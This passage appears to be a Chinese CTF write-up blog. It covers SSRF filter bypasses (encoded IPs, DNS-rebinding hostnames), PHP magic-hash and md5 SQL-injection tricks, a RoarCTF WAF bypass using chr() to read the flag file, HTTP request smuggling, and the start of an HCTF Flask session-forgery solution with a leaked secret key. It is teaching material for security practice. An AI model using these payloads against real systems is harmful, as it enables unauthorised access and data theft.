在dirsearch/db下的dicc.txt 在index.php下添加一条index.phps即可<br> <img src="https://img-blog.csdnimg.cn/20210317221647640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br> 查看源码：<img src="https://img-blog.csdnimg.cn/20210317221810408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">发现里边首先url解码GET得到的字符串 松散比较等于<code>&quot;admin&quot;</code> 构造<code>id=admin</code></p></li></ol><h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p><img src="https://img-blog.csdnimg.cn/20210423211244499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>常见的符号绕过有 @ # / \ ? 多试一试。。</p><h2 id="IP-Bypass"><a href="#IP-Bypass" class="headerlink" title="IP Bypass"></a>IP Bypass</h2><p>127.0.0.1使用的是点分十进制 绕过如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">8</span>进制格式：<span class="hljs-number">0177.00.00</span>.<span class="hljs-number">01</span><br><br><span class="hljs-number">16</span>进制格式：<span class="hljs-number">0</span>x7f.<span class="hljs-number">0x0.0x0</span>.<span class="hljs-number">0</span>x1<br><br><span class="hljs-number">10</span>进制整数格式：<span class="hljs-number">2130706433</span><br><br>特别的，在linux下，<span class="hljs-number">0</span>代表<span class="hljs-number">127.0.0.1</span>，可以用http://<span class="hljs-number">0</span>进行请求<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>8进制<br><img src="https://img-blog.csdnimg.cn/20210423211039257.png#pic_center"><br>16进制<br><img src="https://img-blog.csdnimg.cn/20210423211353222.png#pic_center"><br>10进制整数：<img src="https://img-blog.csdnimg.cn/20210423211439801.png#pic_center"><br>linux：<br><img src="https://img-blog.csdnimg.cn/20210423211503787.png#pic_center"></p><h2 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h2><p>SSRF中有个很重要的一点是请求可能会跟随302跳转</p><p><img src="https://img-blog.csdnimg.cn/20210423211528881.png#pic_center"></p><h2 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h2><p>DNS概念略</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">TTL</span><br><span class="hljs-selector-tag">TTL</span>值全称是“生存时间（<span class="hljs-selector-tag">Time</span> <span class="hljs-selector-tag">To</span> <span class="hljs-selector-tag">Live</span>)”，简单的说它表示<span class="hljs-selector-tag">DNS</span>记录在<span class="hljs-selector-tag">DNS</span>服务器上缓存时间，数值越小，修改记录各地生效时间越快。<br><br>当各地的<span class="hljs-selector-tag">DNS</span>(LDNS)服务器接受到解析请求时，就会向域名指定的授权<span class="hljs-selector-tag">DNS</span>服务器发出解析请求从而获得解析记录；该解析记录会在<span class="hljs-selector-tag">DNS</span>(LDNS)服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，<span class="hljs-selector-tag">DNS</span>服务器将不再向授权<span class="hljs-selector-tag">DNS</span>服务器发出请求，而是直接返回刚才获得的记录；而这个记录在<span class="hljs-selector-tag">DNS</span>服务器上保留的时间，就是<span class="hljs-selector-tag">TTL</span>值。<br></code></pre></td></tr></table></figure><p>利用已经控制的DNS服务器 恶意DNS服务器将TTL值设置为1秒 向查询域的机器响应真实的恶意IP地址 让其缓存迅速失效 （常将访问的目标IP篡改为具有攻击性的地址）</p><p>可以让目标机器的浏览器访问恶意的网站 解析其恶意代码执行如js</p><p>下面的几个网站都是测试这个DNS重绑定漏洞的</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a><br><img src="https://img-blog.csdnimg.cn/20210423211706570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">7</span>f000001<span class="hljs-selector-class">.c0a80001</span><span class="hljs-selector-class">.rbndr</span><span class="hljs-selector-class">.us</span> #payload<br></code></pre></td></tr></table></figure><p><a href="http://xip.io/">http://xip.io/</a></p><p><img src="https://img-blog.csdnimg.cn/20210423211753175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>.xip.io #payload<br></code></pre></td></tr></table></figure><p><a href="http://ceye.io/">http://ceye.io/</a></p><p>后面跟/flag.php 题解！</p><h2 id="md5绕过-hash比较缺陷"><a href="#md5绕过-hash比较缺陷" class="headerlink" title="md5绕过(hash比较缺陷)"></a>md5绕过(hash比较缺陷)</h2><p>因为md5的特性 它有两个漏洞</p><ul><li>MD5加密后的值若开头为0e的话 则认为MD5的值相等</li></ul><p>PHP在处理哈希字符串是 使用**!=** 和 <strong>==<strong>来比较 会把每一个</strong>OE</strong>开头的字符串都解释为0（PHP的科学计数法）</p><table><thead><tr><th align="center">字符串</th><th align="center">MD5加密值</th></tr></thead><tbody><tr><td align="center">QNKCDZO</td><td align="center">0e830400451993494058024219903391</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s155964671a</td><td align="center">0e342768416822451524974117254469</td></tr><tr><td align="center">s214587387a</td><td align="center">0e848240448830537924465865611904</td></tr><tr><td align="center">s878926199a</td><td align="center">0e545993274517709034328855841020</td></tr><tr><td align="center">s1091221200a</td><td align="center">0e940624217856561557816327384675</td></tr><tr><td align="center">0e215962017</td><td align="center">0e291242476940776845150308577824</td></tr></tbody></table><table><thead><tr><th align="center">字符串</th><th align="center">sha1加密值</th></tr></thead><tbody><tr><td align="center">aaroZmOk</td><td align="center">0e66507019969427134894567494305185566735</td></tr><tr><td align="center">aaK1STfY</td><td align="center">0e76658526655756207688271159624026011393</td></tr><tr><td align="center">aaO8zKZF</td><td align="center">0e89257456677279068558073954252716165668</td></tr><tr><td align="center">aa3OFF9m</td><td align="center">0e36977786278517984959260394024281014729</td></tr></tbody></table><ul><li>MD5函数不能处理数组</li></ul><p>MD5()和sha1()处理数组都会返回NULL (a[]=1)</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>原题：BUU [BJDCTF2020]Easy MD5</p><blockquote><p>Hint:“select * from ‘admin’ where password=’”.md5($pass,true)”‘”</p></blockquote><p>特殊字符串：<strong>ffifdyop</strong> <strong>129581926211651571912466741651878684928</strong></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源码首先看到<img src="https://raw.githubkil3rr/photocom/wo02ie/photo/main//2021/06/07/.png"></p><p>WAF不可知，稍后再处理；API中有calc.php，尝试访问，OK的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#黑名单解释</span><br><span class="hljs-string">/i</span> 忽略大小写<br><span class="hljs-string">/m</span>多行查找<br><span class="hljs-string">/g</span>全局匹配字符<br><span class="hljs-string">/gi</span>（<span class="hljs-string">/ig</span>)忽略大小写全局匹配字符<br></code></pre></td></tr></table></figure><p>有黑名单，需要GET传参num，可以看到有eval函数执行$_str=$_GET[‘num’]</p><p>传参试一试，<code>calc.php?num=1</code>传1可以，<code>calc.php?num=phpinfo();</code>发现传不进去，这里应该就是WAF的问题了</p><ul><li>方法一、利用字符串的解析特性</li></ul><p>学习一个知识点，就是PHP的字符串的解析特性</p><p>php在解析字符串时，需要将所有参数转换为有效的变量名，它的处理有两种，删除变量名前面的空格或者将空格和其他字符替换成下划线</p><table><thead><tr><th align="center">User input</th><th align="center">Decoded PHP</th><th align="center">variable name</th></tr></thead><tbody><tr><td align="center">%20foo_bar%00</td><td align="center">foo_bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%20bar%00</td><td align="center">foo bar</td><td align="center">foo_bar</td></tr><tr><td align="center">foo%5bbar</td><td align="center">foo[bar</td><td align="center">foo_bar</td></tr></tbody></table><p>所以说碰到WAF过滤变量里面的字母和非法字符时 可以考虑这个特性绕过</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/123456.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604202438733.png"></p><p>注意一些不能使用的函数，用var_dump()打印scandir()吧</p><p>这个scandir()也可以使用glob()</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604195744654.png"></p><p>为空！注意到刚刚calc.php的黑名单，绕过这种正则匹配的方法比较多，但不一定有效，屡试不爽的是用代码执行顺序的逻辑漏洞，即控制输入的内容为一个待执行函数，然后黑名单匹配不到字符串，代码继续执行下去时，才会解析输入内容中的函数，可以使用ascii转换 即使用chr() 函数代替字符</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604200222049.png"></p><p>看到有flag了</p><p>干脆就用chr()代替所有字符吧</p><p>读取<code>file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p><p>提一嘴一些花式读取文件的操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">show_source()<br>print_r(strip_whitespace())<br>readfile()<br>var_dump(file())<br><span class="hljs-keyword">include</span>()<br></code></pre></td></tr></table></figure><p>拼接即可<img src="https://raw.githubusercontkil3rr/photoie/photo/main/image-20210604201849759.png"></p><ul><li><p>方法二、HTTP走私攻击(HTTP数据接收不同步攻击)</p><p><strong>漏洞形成的原因：</strong></p></li></ul><p>前端服务器（cdn）和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞；为什么会不一致呢？</p><p>主要是处理Content-Length和Transfer-Encoding不一致，原则上同时使用两者时，Content-Length是无效的，当单个服务器时，没有任何问题，但当多个服务器时，理解的数据不一致时，就会出现有些服务器认为Content-Length的长度有效，有些以Transfer-Encoding有效，这样超出的长度就会拼接到下一次请求，从而导致漏洞。</p><ul><li><input checked="" disabled="" type="checkbox"> Content-Type重复绕过WAF</li></ul><p>?num=phpinfo();抓包<code>注意此处变量num前没有空� �</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604213630379.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604213654358.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604213744574.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604214116207.png"></p><p>其他走私的姿势 具体见http走私攻击.md和http-desync-attacks-ppt.pdf</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="方法一、弱密码"><a href="#方法一、弱密码" class="headerlink" title="方法一、弱密码"></a>方法一、弱密码</h3><p>admin/123</p><p>我只能说这题太难了</p><h3 id="方法二、session伪造"><a href="#方法二、session伪造" class="headerlink" title="方法二、session伪造"></a>方法二、session伪造</h3><p>熟悉各功能点</p><p>查看首页源码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main//2021/06/08/.png"></p><p>说明这题需要admin登录 获得flag</p><p>继续测试各功能点 并查看源码 终于发现change password源码中出现网站源码泄露</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608002321159.png"></p><p>可见是flask模板 百度一下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608002450573.png"></p><p>下载后的源码包遍历后，routes.py和config.py是可以利用的点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#routes.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response<br><span class="hljs-keyword">from</span> flask_login <span class="hljs-keyword">import</span> logout_user, LoginManager, current_user, login_user<br><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> app, db<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> Config<br><span class="hljs-keyword">from</span> app.models <span class="hljs-keyword">import</span> User<br><span class="hljs-keyword">from</span> forms <span class="hljs-keyword">import</span> RegisterForm, LoginForm, NewpasswordForm<br><span class="hljs-keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="hljs-keyword">import</span> nodeprep<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> code <span class="hljs-keyword">import</span> get_verify_code<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_code</span>():</span><br>    image, code = get_verify_code()<br>    <span class="hljs-comment"># 图片以二进制形式写入</span><br>    buf = BytesIO()<br>    image.save(buf, <span class="hljs-string">&#x27;jpeg&#x27;</span>)<br>    buf_str = buf.getvalue()<br>    <span class="hljs-comment"># 把buf_str作为response返回前端，并设置首部字段</span><br>    response = make_response(buf_str)<br>    response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/gif&#x27;</span><br>    <span class="hljs-comment"># 将验证码字符串储存在session中</span><br>    session[<span class="hljs-string">&#x27;image&#x27;</span>] = code<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, title = <span class="hljs-string">&#x27;hctf&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>():</span><br><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    form = RegisterForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():<br>            flash(<span class="hljs-string">&#x27;Wrong verify code.&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form=form)<br>        <span class="hljs-keyword">if</span> User.query.filter_by(username = name).first():<br>            flash(<span class="hljs-string">&#x27;The username has been registered&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;register&#x27;</span>))<br>        user = User(username=name)<br>        user.set_password(form.password.data)<br>        db.session.add(user)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;register successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    form = LoginForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = name<br>        user = User.query.filter_by(username=name).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> user.check_password(form.password.data):<br>            flash(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        login_user(user, remember=form.remember_me.data)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, title = <span class="hljs-string">&#x27;login&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    logout_user()<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/index&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    form = NewpasswordForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(session[<span class="hljs-string">&#x27;name&#x27;</span>])<br>        user = User.query.filter_by(username=name).first()<br>        user.set_password(form.newpassword.data)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;change successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change.html&#x27;</span>, title = <span class="hljs-string">&#x27;change&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/edit&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>():</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        flash(<span class="hljs-string">&#x27;post successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, title = <span class="hljs-string">&#x27;edit&#x27;</span>)<br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page_not_found</span>(<span class="hljs-params">error</span>):</span><br>    title = unicode(error)<br>    message = error.description<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;errors.html&#x27;</span>, title=title, message=message)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span>(<span class="hljs-params">username</span>):</span><br>    username = nodeprep.prepare(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#config.py</span><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    SECRET_KEY = os.environ.get(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;ckj123&#x27;</span><br>    SQLALCHEMY_DATABASE_URI = <span class="hljs-string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span><br>    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>从routes.py入手看一下index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">#index.html &#123;% include(&#x27;header.html&#x27;) %&#125; &#123;% if current_user.is_authenticated %&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125; &#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27;<br>%&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125;<br><span class="hljs-comment">&lt;!-- you are not admin --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>&#123;% include(&#x27;footer.html&#x27;) %&#125;<br></code></pre></td></tr></table></figure><p>可见 session值是admin时 我们即取得flag 那么这就涉及session伪造 在routes.py找到<code>login</code>处的<code>current_user.is_authenticated</code>通过GET或者POST登录都可以 现在要解决的就是session的问题</p><p>抓包看一下<img src="https://raw.githubusercokil3rr/photo02ie/photo/main/image-20210608100040088.png"></p><p>百度再次查找flask框架的session问题</p><blockquote><p>flask的session是通过加密之后放到了cookie中。所以有加密就有密钥用于解密，所以，只要用到了flask的session模块就一定要配置“SECRET_KEY”这个全局宏。一般设置为24位的字符。配置方法一般有两种。</p><p>配置方法一：</p><p>新建一个config.py的文件配置secret_key</p><p>config.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SECRET_KEY = <span 